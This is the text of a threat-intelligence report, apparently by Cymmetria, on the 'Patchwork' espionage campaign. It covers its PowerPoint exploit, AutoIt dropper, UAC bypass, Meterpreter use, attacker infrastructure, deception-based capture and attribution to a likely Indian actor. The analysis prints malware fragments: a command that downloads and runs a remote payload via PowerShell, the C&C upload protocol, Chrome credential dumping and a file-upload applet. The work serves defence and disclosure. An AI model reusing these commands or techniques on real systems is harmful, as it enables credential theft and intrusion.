There are indications of activity as early as 2014 , but Cymmetria has \nnot observed any such activity first hand . \nPatchwork targets were chosen worldwide with a focus on personnel working on military and \npolitical assignments, and specifically those working on issues relating to Southeast Asia and the \nSouth China Sea. Many of the targets were governments and government -related organizations . \nWhat makes this report special is that Patchwork is the first targeted threat captured using a \ncommercial deception product. Through the use of deception campaigns created with \nCymmetria’s MazeRunner, we were able to catch the threat actor’s second stage toolset, as well \nas lateral movement activity . \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \nThe deception campaign (see “The investigation” section)  \n  EXECUTIVE SUMMARY  \nThe code used by this threat actor is copy -\npasted from various online forums, in a way \nthat reminds us of a patchwork quilt – hence \nthe name we’ve given the operation . \n \nIn active victim systems, Patchwork \nimmediately searches for and uploads \ndocuments to their C&C, and only if the \ntarget is deemed valuable enough, proceeds \nto install a more advanced second stage \nmalware.  \n \nIt is impossible to reach clear attribution \nfrom the information available. We have \nincluded an attribution section in this \ndocument to document our research efforts \nin this regard.  Attacker operating times that overlap with a \nstandard 9am-7pm workday (darker means \nlarger volume)  \n 5 \n Research  TLP: GREEN  \n  \nACKNOWLEDGEMENTS  \nWe would like to acknowledge our colleagues Brandon Levene  at Palo Alto Networks, Kaspersky \nLab’s GReAT  team, and others whom we can’t mention, for their assistance and cooperation . \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n 6 \n Research  TLP: GREEN  \nOVERVIEW  \nThe attack was detected as part of a spear phishing against a government organization in Europe \nin late May 2016 . The target was an employee working on Chinese policy research and the attack \nvector was a PowerPoint presentation file. The content of the presentation was on issues relating \nto Chinese activity in the South China Sea.  \n \n \n \n \n \n \n \n \n \n \n \n \n \n \nScreenshot of the first slide from one of the infected presentations  \n \nAfter the presentation is opened, the vulnerability highlighted by CVE -2014 -4114 is exploited. \nThis is a well documented vulnerability commonly called Sandworm, which only works on \nunpatched versions of Microsoft Office PowerPoint 2003 and 2007 . \nOnce the exploit worked, it deployed the first stage payload: a compiled AutoIt  script. This script \nthen bypassed UAC using a known method called UACME, the code for which was taken from an \nonline forum.  \n \n \n \n \n \n \n \n \n \nScreenshot of the AutoIt  malware publication forum post1 \n_________________  \n¹ http ://www.indetectables.net/viewtopic.php?f= 7&t=52263 &sid=b 6fe274a4e8934 fceb 0f3fc90cd35aa2 THE INVESTIGATION  \n7 \n Research  TLP: GREEN  \nWith higher privileges, the first stage payload ran PowerSploit  to download code to run a reverse \nshell with Meterpreter  – the RAT of the well known MetaSploit  framework.  \nThe next stage was exfiltration of document files that are also used to validate the value of the \ninfection. If the infected system was deemed valuable enough, the threat actor then infected the \ntarget host with a second stage payload, which was once again a module built from code taken \nfrom various online forums and resources . \n \n \n \n \n \n \n \n \n \n \n \n \n \nFlowchart of infection stages  \n \nSince the threat had already been detected and stopped, our goal was to discover as much as we \ncould about the threat actor. Specifically, we were interested in tools, techniques, and \nprocedures (TTPs), so that we would be able to detect the threat in case it succeeded in gaining a \nfoothold elsewhere in customers’ assets. Learning about the threat actor’s TTPs would also allow \nus to prevent the threat actor from launching another operation targeted at our customer, as \nwell as prevent them from launching similar attacks against other customers in the future.  \nOur investigation proceeded on two fronts:  \n1.We built a deception campaign to discover the second stage malware and the actor’s TTPs, \nwhile the operation was still active.  \n2.We investigated the operation to uncover the threat actor’s capabilities.  \n \nHUNTING THE ATTACKER WITH A DECEPTION CAMPAIGN  \nIn order to capture the attacker’s second stage malware (persistence) and observe their pivoting \nbehavior in the network (lateral movement), we created a realistic environment in which to hunt \nthe threat actor. We did so by using Cymmetria's MazeRunner solution to deploy a deception \ncampaign. A deception campaign is essentially a story comprised of breadcrumbs and decoys; it \nleads attackers to believe that they have successfully gained access to a target machine.  \nBreadcrumbs are pieces of data that lead an attacker to another machine; these could be stored \ncredentials, open shares, browser cookies, VPN configurations, and more. Decoys  are full \noperating systems running on virtual machines that act as real and high -value targets for an \nattacker; breadcrumbs point to decoys, which are fully monitored for any attacker interaction . \n \n8 \n Research  TLP: GREEN  \nThe campaign (which can be found on Cymmetria Research’s GitHub ) was built to fit the specific \nprofile of the active target. MazeRunner captured all the forensic data associated with the threat, \nso we knew that the threat actor followed the breadcrumbs and activated all the stages of their \nattack. MazeRunner allowed us to see all of the network traffic, operating system changes, and \nlateral movement the threat actor performed.  \nThis is the first time, to our knowledge, that an APT (or more aptly, a targeted attack) has been \ndeceived and captured by a deception solution that caused the threat actor to follow \nbreadcrumbs and attack decoys , ultimately leading to the disclosure of the operation.  \n \n \n \n \n \n \n \n \n \n \nThe deception campaign that caught the APT  \nGETTING STARTED  \nAs mentioned in the previous section, our first order of business was verifying that the operation \nwas still active, and then creating a deception campaign around it to catch the second stage \nmalware and discover and mitigate other TTPs being used by the threat actor. To this end, we \ncreated a target in the form of a profile for a person in whom the threat actor was interested. We \nthen constructed a deception campaign based on that profile. In this case, the person was a \nmember of a government think tank dealing with security issues.  \nA network around the infected endpoint was created using MazeRunner:  \n•SMB shares were created on decoys, and mapped on the target laptop, to play the part of \nnetwork backups.  \n•Further, RDP credentials were deployed on the laptop to lead to a service running on a decoy \nsystem in the cloud.  \n \n \n \n \n \n \n \n \n \n \nSMB breadcrumb leading to the file server decoy  \n \n \n9 \n Research  TLP: GREEN  \n \n \n \n \n \n \n \n \n \n \n \nRDP Breadcrumb that leads to a cloud decoy  \n \nCHAIN OF EVENTS  \n1.The PowerPoint PPS file was opened, which in turn dropped the initial payload components. \nThe exploit used was CVE -2014 -4114 (Sandworm).  \n \n               \n \n \n \n \n \nDriver.inf content  \n1.    \n2.The endpoint was infected with the following executables:  \n•sysvolinfo.exe  – AutoIt  compiled script.  \n•PowerShell reverse shell HTTPS Meterpreter  script – Was pulled from the C 2 server \nand was executed using the following requests:  \n•212[.]129.13.110 /dropper.php?profile =<base64 of \n[username@computername ]> \n•hxxps://45[.]43.192.172 :8443/OxGN  \n3.Files from the target laptop were being uploaded by the threat actor to the control server, \nalongside significant activity on the encryption channel. We did not monitor the SSL encrypted \nchannel, in order to avoid detection in case Meterpreter’s “sstagerverifysslcert ” \noption was used . \n4.The threat actor decided to drop the second stage malware, 7zip.exe , onto the infected \nendpoint. The tool scanned the hard disk, and talked with 212[.]83.191.156 . \n5. It copied itself as netvmon.exe  into C:\\Windows\\SysWOW64\\netvmon.exe and added \nthat path to the startup programs. This is how the threat actor achieves persistence . \n \n10 \n Research  TLP: GREEN  \n6.Three days following the initial infection, alerts were received on the decoy running the SMB \nshared folder indicating access by the threat actor.  \n7.The malware accessed the mapped share that was deployed as a breadcrumb on the infected \nlaptop while scanning all the drives for files. The actual function that caused the alert was \nGetDriveTypeA  (which is called to assure that only fixed drives are traversed).  \n8.After the first alerts in the system were generated, we saw connection attempts to our cloud \ndecoy via RDP. This decoy’s IP address was placed as an RDP credentials breadcrumb on the \ntarget laptop . The alerts originated from 212[.]129.7.146 , and the entire event lasted for \n12 minutes.  \n9. The alerts we received in MazeRunner  indicated that the attackers failed to log in several \ntimes, which makes us believe that they pulled the RDP connection file (breadcrumb) that was \non the infected desktop. It is interesting to note that they didn’t mine the credentials using \nmimikatz  (which would have enabled them to connect to the cloud decoy with ease).  \n10. We believe this connection was carried out by the same threat actor because:  \n•The IP they used to connect to our decoy also belongs to rev.poneytelecom.eu . \n•The event took place on the same day we received the alerts on our internal system.  \nThis shows that the threat actor was deceived into exfiltrating  data, deploying their second \nstage persistence tool, and using the breadcrumbs that we left on the infected laptop. \nFurthermore, if they had used mimikatz , they also would have succeeded in connecting to our \ncloud decoy and be encouraged to deploy other, later stage tools.  \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \nNetwork layout   \n 11 \n Research  TLP: GREEN  \nINTELLIGENCE GAINED FROM THE ACTOR’S C&C SERVER  \nThrough one of our partners, we managed to receive access to one of the threat actor’s \ncommand and control servers. The server contained a multitude of additional files:  \n•An abundance of PPS files – the spear phishing infecting files  \n•Additional malicious code packages  \nMost of the spear phishing files’ content2 was directly related to China -related subjects, or \npornographic in nature. Some examples of the spear phishing PPS attachment files used by the \nthreat actor : \n \n \n \n \n \n \n \n \n \n \n \n \n \n \nFrom the C&C server, we also extracted the dates on which the PPS lures were last modified; \nthese dates ranged from December 2015 to January 2016 . The dates were grouped together and \nthen plotted. The resulting graph is a good indication of times at which we believe the attackers \nprepared and carried out their attack . \n \n \n \n \n \n \n \n \n \n \nNumber of PPS edits by date  \n_____________  \n2 We have no direct proof of this, but information from several partners suggests that stolen documents \nare being actively repurposed for spear phishing purposes.   \n \n12 \n Research  TLP: GREEN  \nTOOLS DEPLOYED  \nATTACK VECTOR  \n \n \n \n \n \n \n \n \n \n \n \nFlowchart of infection stages  \n \nThe attack vector is a spear phishing email with a PPS file attachment. It utilizes the exploit of \nCVE-2014 -4114 (Sandworm). The exploit code closely resembles a public proof of concept exploit \nfound on exploit -db1³. The exploit enables the attacker to drop files and execute an INF file, \nwhich is a Windows driver descriptor file.  \n \nThrough the exploit, the attack drops two files that are embedded in an OLE object to the local \nmachine:  \n•Driver.inf  \n•Sysvolinfo.exe  \n \n \n \n \n \n \n \nDriver.inf content  \n \nAfter dropping the files, the exploit executes the INF file by calling the Windows utility \nInfDefaultInstall.exe  with the dropped driver.inf  as a parameter.  \nThis causes the execution of the Windows utility RunOnce.exe , which receives the \nsysvolinfo.exe  file as a parameter and executes it . \n_____________  \n³ https ://www.exploit -db.com/exploits/ 35019 / \n TECHNICAL ANALYSIS  \n13 \n Research  TLP: GREEN  \nDROPPER  \nThe sysvolinfo.exe  is the first stage payload of the threat actor (another name seen is \nuplv1032.exe ). Its purpose is to escalate privileges, exfiltrate  data, and download and execute \nan online remote access tool based on PowerSploit ⁴. Through the now installed Meterpreter, the \nactor can issue commands to run on the infected machine manually.  \n \n \n \n \n \n \n \n \n \n \nOriginally created by an unknown user of “O RLY Cover Generator”5 \n \nThe sysvolinfo.exe code itself is a compiled AutoIt  script. A significant portion of its code is \ncopied from the online hacking forum “ Indetectables”6. \n \nC&C COMMUNICATIONS  \nOnce the tool starts, its first action is to connect back to the C&C server and send a beacon, \nlistening for commands. Below is the analysis of the C&C protocol.  \nDefinitions:  \n ComputerID  = BASE64ENCODE(“$USERNAME@$COMPUTERNAME”)  \n ddager = Is startup registry key added (Bool)  \n r1 = BASE64ENCODE(result of OSVersion  macro, e.g. WIN_ 7) \n r2 = BASE64ENCODE(result of OSArch macro, e.g. X 64) \n r3 = BASE64ENCODE(trojan version, 1.1 in our sample)  \n r4 = BASE64ENCODE(Does the SQLite database folder ( \n @UserProfileDir  &  “\\AppData\\Local\\Google\\Chrome\\User \n Data\\Default\\”) exist ( 1) or not ( 0)) \n r5 = BASE64ENCODE(stdout of last cmd command)  \n r6 = BASE64ENCODE(1 if running as administrator, 0 if not) \nOn beacon function call a POST request to:   \n     - hxxp://212[.]129.13.110 /dropper.php?profile= + $ ComputerID   \n _____________  \n⁴ PowerSploit : the PowerShell version of Meterpreter , a popular remote access tool from the MetaSploit  \nframework . \n⁵ https://dev.to/rly  \n6 http ://www.indetectables.net/viewtopic.php?f= 7&t=52263 &sid=b 6fe274a4e8934 fceb 0f3fc90cd35aa2 \n14 \n Research  TLP: GREEN  \n Which is sent with the following parameters:  \n- ddager, r1, r2, r3, r4, r5, r6.  \nThe return value of the request is structured as follows:  \n- “$sdata|$payload” , where sdata  is the command to run (by id, 1-8), and payload  \nis the argument for the command . \nThe available commands are : \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \nFunctions : \n_emorhc($dllurl) – Searches for sqlite3.dll  (or sqlite3_x64.dll  in 64 bit). If not \nfound, it downloads it from $dllurl . The function then proceeds to close all the “chrome.exe” \nprocesses, dump the login data database @USERPROFILEDIR & \n\"\\AppData\\Local\\Google\\Chrome\\User Data \\Default\\Login Data\" \ninto  C:\\recoveryx \\Protected.ie 2, upload the file, and delete it. Note: the authors forgot to \ndelete the c:\\recoveryx directory . \n_getnewver ($newverurl ) – Deletes itself, downloads a new version from $newverurl , and \nexecutes it. Cmd command : \n \n“cmd.exe /c ping -n 5 127.0.0.1 > nul & del \" & @SCRIPTFULLPATH & \" & ping -n \n5 127.0.0.1 > nul & powershell  IEX (New -Object \nSystem.Net.WebClient ).DownloadFile ('\" & $newverurl  & \"', '\" & @SCRIPTFULLPATH \n& \"') & \" & @SCRIPTFULLPATH”.   \nThey are using ping between commands for an unknown reason.

It uploads the \nfile $f_path to hxxp:// 212[.]129.13.110 /update-request.php?profile = + \n$ComputerID , with a maximum retry count of 5. The post contains the following data : \n \n\"Content -Disposition: form -data; name=\"\"filename\"\"; filename=\"\"\" & \n$f_name & \"|\" & $ f_hash & \"\"\"\" & @CRLF & @CRLF & $ ffile & @CRLF  \n \nWhere $f_hash is the md5 cheksum of the file to be uploaded, $f_name is the base64 \nencoding of $f_name , and  $ffile is the content of the file.  \nAfter sending beacon to the server, it continues to scan the “Program Files” directories (both x 86 \nand the standard path) for a directory with the string “Total Security ”⁶ (the installation path of the \n“360 Total Security”7 antivirus), and, oddly, proceeds to do nothing with that knowledge.  \nThe payload will install itself in the startup programs folder as \"Baidu Software Update\" \n(HKEY_CURRENT_USER \\SOFTWARE \\Microsoft \\Windows\\CurrentVersion \\Run). It then \nsends another beacon to the server, after which it starts to recursively go over all of the fixed \ndrives in the computer and look for files with the following extensions:  \n•doc \n•pdf \n•csv \n•ppt \n•docx  \n•pst \n•xls \n•xlsx \n•pptx \n \nIt then uploads all of the files to the server at:  \n212[.]129.13.110 /update-request.php?profile = \nThe decompiled applet which drives this functionality has a very interesting PDB included \n“C:\\Users\\Kanishk\\Documents \\Visual Studio \n2015\\Projects \\ConsoleApplication 1\\ConsoleApplication 1\\obj\\Debug\\ConsoleA\npplication 1.pdb”. \n \n \n \n \n \n \n____________  \n7 https ://www. 360totalsecurity.com / \n 16 \n Research  TLP: GREEN  \nApplet code included below:  \nnamespace ConsoleApplication 1 \n{ \n    internal class Program  \n    { \n        private static void Main(string[] args) \n        { \n            try \n            { \n                string fileName  = args[0]; \n                WebClient  webClient  = new WebClient (); \n                webClient.UploadFile (args[1], \"POST\", fileName ); \n            } \n            catch \n            { \n            } \n        } \n    } \n} \n \nPRIVILEGE ESCALATION  \nAfter the previous stages, the payload uses a well known and as -of-yet unpatched UAC bypass \nvulnerability in Microsoft Windows (known as UACME8), which works on the default setup of \nWindows 79. This allows the attackers to execute commands as Administrator . \nIf the AutoIt  script is compiled for x 86 systems (/x 86 flag), the payload hides the UAC bypass \nvulnerability exploitation inside svchost.exe  using a technique called Process Hollowing10 (UAC \nbypass method – ‘IFileOperation  COM Object’11). If the AutoIt  script is compiled for x 64 systems \n(/x64 flag), the oobe12 UAC bypass method is used . \n \n \n \n \n \n___________  \n8 https ://github.com/hfiref 0x/UACME  \n9 According to research, also Windows 8 as claimed by Peter Kleissner , \nhttps ://download.pureftpd.org/misc/UAC.cpp  \n10 https ://www.trustwave.com/Resources/SpiderLabs -Blog/Analyzing -Malware -Hollow -Processes  \n11 https ://www.greyhathacker.net/? p=796 \n12 http ://www.labofapenetrationtester.com/ 2015 /09/bypassing -uac-with -powershell.html  \n \n \n \n \n 17 \n Research  TLP: GREEN  \nSHELLCODE EXECUTION  \nWhen the AutoIt  malware’s heartbeat receives a “ 2” in $sdata (this seems to be the most \ncommon scenario), the included, base 64-encoded response data is decoded and executed using \nthe command “powershell  -nop -wind hidden -noni -enc”. We observed that the \nbase 64 encoded payload was a PowerShell script that closely resembled code designed to allow \nx86 shellcode  to run on x 64 architectures13. This PowerShell script executed an additional \npayload, which was a PowerSploit  script14 used to invoke shellcode  containing a reverse HTTPS \nMeterpreter . \n \nREVERSE HTTPS METERPRETER  \nThe AutoIt  script escalates privileges and then executes a PowerShell script that is easily \nfingerprinted as a reverse HTTPS Meterpreter . It seems likely that the PowerShell scripts were \ncopied from an online blog15, and the Meterpreter  payload inside was generated using the \nparameters:  \n•LHOST=45[.]43.192.172  \n•LPORT=8443 \n \n \n \n \n \n \n \n \n \nThe process tree of the initial exploit and later payloads  \n \nSECOND STAGE PAYLOAD  \nThis tool is only downloaded and installed after the attacker first uses the Meterpreter  and \ndetermines that the target is valuable.

Circumstantially, this targeting correlates with intelligence requirements \nnecessary for a pro -Indian entity . \nHowever, we felt this was not enough to draw direct conclusions. What we believe makes this \ncorrelation much stronger and hints that this is a pro -Indian or Indian entity, is the addition of \ntime of day activity analysis as detailed below . \n \nPPS EDIT TIME ANALYSIS17 \nFollowing a review of the PPS files found on the C&C server, we extracted data concerning the \ntime of day when each PPS file was last modified, and plotted this on a graph. Below, we can see \nthat more editing occurred during certain hours of the day.  \n \n \n \n \n \n \n \n \n \n \n \n \n \nNumber of edits by time of day \n \n \n___________  \n17 Time zone analysis and research activity associated with daytime hours is circumstantial by definition. \nSome threat actors work around the clock, and manipulation of timestamps has been seen in past attacks \nby various threat actors. While it should be treated with due suspicion, it has also proven itself highly \nvaluable in analysis of APT threat actors in the past and cannot be discounted.  ATTRIBUTION  \n20 \n Research  TLP: GREEN  \nBased on modification times of the infecting presentation files, we see two distinct batches of \nwork. The first, where the bulk of changes has been made, stretches from around 4:00 to 12:00 \nin coordinated universal time. To visualize what exactly that means, this time range was \nconsidered in the context of a standard 9am - 7pm work day and applied to a map. The “First \nstretch of work” label on the map below depicts the areas of the world in which 4:00 - 12:00 UTC \nwould fall within the standard work day. Similarly, the time zones shaded within the “Second \nstretch of work” area are representative of the areas of the world in which 19:00 - 22:00 UTC falls \nwithin the work day. Since the time span of the second stretch of work is smaller in range, the \nhours in universal time fall within the working hours of more countries. Based on this map, we \ncan conclude that it is most likely that the threat actors were based within the blue  areas.  \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \nAttacker operating times that overlap with a standard 9am-7pm workday (darker means larger \nvolume)  \n \nMany of the conclusions drawn from the above map were also confirmed through other sources. \nExtra data we were able to extract and analyze further correlated with this data, as well as with \nthe previous PPS data.  \n \n \n21 \n Research  TLP: GREEN  \nC&C ACTIVITY TIMES  \nThe time at which servers were staged was listed not only by hour, but by day of the week. After \nplotting these times by hour, with the day of the week specified through color coordination, we \ncan see various patterns. It was more common for servers to be staged on certain days of the \nweek, such as Sunday, rather than on other days, such as Saturday. These times are also \nclustered together in a clump for the most part, with almost no activity earlier than 2:00 UTC, \nand besides one exception on Sunday, not later than 11:00 UTC. This clump is very similar to the \nrange of time specified within the first clump of time in the PPS editing graph and the “First \nstretch of work” area of the “Threat actor working hours” diagram.  \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \nDisplays the number of times a server was staged by hour of day, color -coordinated by day of \nthe week  \n \nOther data extracted from the server included the time of day and day of the week of domain \nregistrations. After plotting these on a graph, we observed that domains were registered only on \nspecific days of the week. The other important feature is that all of these incidents occurred \nbetween 3:00 and 15:00 UTC, which is a slightly wider range than the first stretch of time in the \nPPS editing graph, but still very comparable.  \n \n \n \n22 \n Research  TLP: GREEN  \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \nDisplays the number of domain registrations by hour of day, color -coordinated by day of the \nweek  \n \nExtra analysis we were able to conduct was on the compilation times, by time of day and day of \nthe week. After plotting these on a graph, we observed that, similar to domain registrations, \ncompilations only occurred on specific days of the week. All the events took place between 2:00 \nand 10:00 UTC, which is only a slight shift of the time span in the first stretch of PPS editing.  \n \n23 \n Research  TLP: GREEN  \n \nDisplays the number of compilations by hour of day, color -coordinated by day of the week  \n \nAll three of these graphs provide confirmation that these attacks were clustered partially by day \nof the week but mostly by time of day. Specifically, the time of day when staging servers, domain \nregistration, and compilations occurred most frequently lined up with the first stretch of time \nseen in the PPS18 editing data. This applies to the area of the map within the “First stretch of \ntime” label and adds weight to our conclusion that the threat actors live in the blue area . \nThis time of day activity data, when combined with the previous circumstantial evidence (the \nthreat actor’s intelligence requirements, the countries targeted around India, the other targets \naround the world, and the content of the spear phishing, directs us to the conclusion that this \nthreat actor correlates with a location in India . \nCarefully, we feel obligated to note that further evidence suggests potential links between this \nthreat actor and the operations known as Hangover/ Appin , but this possible link is still being \nresearched and is far from conclusive . \nThat said, attribution is tricky business and it’s never possible to be entirely conclusive.  \n \n \n \n___________  \n18 Information from several partners suggests that the documents being stolen and then \nrepurposed for spear phishing purposes also contain language indicators that support our \nhypothesis, but we have no direct information to support this.  \n24 \n Research  TLP: GREEN  \nPatchwork is a highly successful targeted attack operation, infecting approximately 2,500 high -\nvalue targets worldwide. It is surprising that it has remained undetected since its operations \nbegan in December, as it seems to have been built out of a confluence of code taken from \nvarious public and hidden criminal forums, as well as various open source projects . \nWhat makes this disclosure special is the use of Cymmetria’s cyber deception platform19 to catch \nthe threat actor, capturing their second stage toolset and lateral movement activity. Without \ndeception, capturing second -stage tools and activity has previously been difficult (to say the \nleast ). \nThe high degree of operational capacity stands in stark contradiction to the low technical ability \ndisplayed, which raises the question of whether the copy -paste nature of the threat was \npotentially intentional, perhaps an evolution of threat actors attempting to avoid the high cost of \nlosing their expensive tool box and malware when they are eventually publically disclosed. This, \nhowever, seems unlikely, as the use of such second -hand code is consistent with their second \nstage toolset meant for persistence, which should typically be built to resist detection . \nWhile one can almost never be conclusive in attribution, based on the information we have it is \nplausible that the threat actor is a pro -Indian one. As our CEO Gadi Evron said in an internal \ndiscussion, “There is a possibility that another threat actor wanted to look like India and built a \nfalse flag operation to fit, but there is zero evidence to support that claim, and it feels like we’re \nreaching just to attack our own argument .” \nUnlike other APT threat actors, India seems to be a relatively quiet locale for cyber espionage \nactivity, if indeed this is a pro -Indian threat actor, it is noteworthy by itself . The scope and scale \nof this operation are quite surprising considering the low technical capability displayed, which we \nbelieve is a growing trend seen among disparate  threat actors.  \n \n \n \n
